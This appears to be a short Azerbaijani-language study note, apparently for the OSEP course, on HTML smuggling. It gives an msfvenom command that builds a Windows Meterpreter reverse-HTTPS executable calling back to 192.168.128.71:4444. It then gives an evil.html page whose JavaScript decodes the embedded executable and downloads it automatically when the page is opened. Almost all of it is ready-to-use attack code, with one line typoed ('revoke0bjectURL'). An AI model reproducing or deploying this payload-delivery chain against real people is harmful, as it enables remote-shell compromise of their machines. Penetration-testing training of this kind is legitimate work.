## İlk öncə payloadı yaradırıq

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.128.71 LPORT=4444 -f exe -o /var/www/html/osep.exe
```

# Yaratdıqdan sonra isə hədəfdə url açılan kimi yüklənməsi üçün javascript-dən istifadə edib kod yazırıq.

```
evil.html

<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) { 
            var binary_string = window.atob(base64); 
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } 
            return bytes.buffer;
            }
		var file='Burda faylin base64 deyerini yaziriq ex:base64 osep.exe'
		var data =base64ToArrayBuffer(file);
            	var blob = new Blob( [data], {type: 'octet/stream'});
            	var fileName = 'osep.exe'

		var a = document.createElement('a');
		document.body.appendChild(a); 
		a. style='display: none';
		var url = window.URL.createObjectURL(blob);
		a.href = url;
		a.download = fileName;
		a.click();
		window.URL.revoke0bjectURL(url);
        </script>
    </body>
</html>

```

# Belelikle biz evil.html faylini browserde acsaq, osep.exe avtomatik endirilecek
